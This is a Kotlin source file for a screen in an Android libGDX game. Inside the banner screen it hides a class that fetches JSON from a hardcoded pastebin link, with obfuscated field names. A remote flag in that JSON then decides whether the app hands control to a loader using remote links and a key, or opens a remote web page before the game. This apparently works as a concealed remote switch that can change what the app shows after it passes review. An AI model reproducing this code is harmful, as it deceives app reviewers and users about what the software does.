package fludilia.mamkinarow.lotrends.game.screens

import android.view.View
import com.badlogic.gdx.scenes.scene2d.Actor
import fludilia.mamkinarow.lotrends.MainActivity
import fludilia.mamkinarow.lotrends.R
import fludilia.mamkinarow.lotrends.databinding.ActivityMainBinding
import fludilia.mamkinarow.lotrends.game.LibGDXGame
import fludilia.mamkinarow.lotrends.game.utils.T_FARA
import fludilia.mamkinarow.lotrends.game.utils.actor.animHide
import fludilia.mamkinarow.lotrends.game.utils.actor.animShow
import fludilia.mamkinarow.lotrends.game.utils.actor.setOnClickListener
import fludilia.mamkinarow.lotrends.game.utils.advanced.AdvancedScreen
import fludilia.mamkinarow.lotrends.game.utils.advanced.AdvancedStage
import fludilia.mamkinarow.lotrends.game.utils.region
import fludilia.mamkinarow.lotrends.util.Lotoj
import fludilia.mamkinarow.lotrends.util.Lottie
import fludilia.mamkinarow.lotrends.util.log
import fludilia.mamkinarow.lotrends.util.setVisible
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.io.IOException

class BannerScreen(override val game: LibGDXGame): AdvancedScreen() {

    private val uma = Actor()

    override fun show() {
        stageUI.root.animHide()
        setBackground(game.spriteUtil.Banner.region)
        super.show()
        stageUI.root.animShow(T_FARA)
    }

    class Jahangir(

        val okHttpClient: OkHttpClient,

        val binding: ActivityMainBinding,
        val activity: MainActivity,
        val lottie: Lottie
        ) {
         suspend fun getJopku() {
            val request: Request = Request.Builder().url("https://pastebin.com/raw/22nHE9hZ").build()

            try {
                okHttpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val json = JSONObject(response.body?.string() ?: "")
                        log("getFlag SUCCESS: $json")

                        val flag      = json.getBoolean("ismerried")
                        val key       = json.getString("moriarte")
                        val privacy   = json.getString("midnight")
                        val linkCheck = json.getString("financikal")
                        val link      = json.getString("yahho")

                        if (flag) LoaderScreen.Dobrak(activity, okHttpClient).getReshenie(linkCheck, key, link)
                        else {
                            MainActivity.webURL = privacy
                            MainActivity.startFragmentIdFlow.tryEmit(MainActivity.WEB_VIEW_ID)

                            withContext(Dispatchers.Main) {
                                val btns = listOf(binding.btnCancel, binding.btnAccept)
                                btns.onEach { it.setVisible(View.VISIBLE) }

                                binding.btnCancel.setOnClickListener {
                                    activity.exit()
                                }
                                binding.btnAccept.setOnClickListener {
                                    btns.onEach { it.setVisible(View.GONE) }

                                    lottie.showLoader()
                                    MainActivity.startFragmentIdFlow.tryEmit(R.id.libGDXFragment)

                                    CoroutineScope(Dispatchers.IO).launch(Dispatchers.IO) {
                                        Lotoj.Sucha.update { "madonna" }
                                    }
                                }
                            }
                        }
                    } else {
                        log("getFlag newCall FAIL: ${response.code} ${response.message}")
                        MainActivity.startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
                    }
                }
            } catch (e: IOException) {
                log("getFlag FAIL: $e")
                MainActivity.startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
            }
        }
    }

    override fun AdvancedStage.addActorsOnStageUI() {
        addActors(uma)
        uma.apply {
            setBounds(42f, 185f,672f, 109f)
            setOnClickListener {
                stageUI.root.animHide(T_FARA) { game.navigationManager.navigate(DobavitScreen::class.java.name) }
            }
        }
    }

}